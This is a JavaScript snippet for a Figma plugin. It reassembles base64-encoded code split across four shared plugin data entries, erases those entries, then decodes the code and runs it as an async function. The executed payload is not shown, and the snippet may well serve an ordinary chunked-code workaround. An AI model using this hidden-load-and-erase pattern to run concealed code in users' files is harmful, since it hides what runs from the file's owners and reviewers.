const b64=figma.root.getSharedPluginData("careapp","bn05_0")+figma.root.getSharedPluginData("careapp","bn05_1")+figma.root.getSharedPluginData("careapp","bn05_2")+figma.root.getSharedPluginData("careapp","bn05_3");
figma.root.setSharedPluginData("careapp","bn05_0","");
figma.root.setSharedPluginData("careapp","bn05_1","");
figma.root.setSharedPluginData("careapp","bn05_2","");
figma.root.setSharedPluginData("careapp","bn05_3","");
const bin=Uint8Array.from(atob(b64),c=>c.charCodeAt(0));
const code=new TextDecoder().decode(bin);
const AsyncFunction=Object.getPrototypeOf(async function(){}).constructor;
return await new AsyncFunction(code)();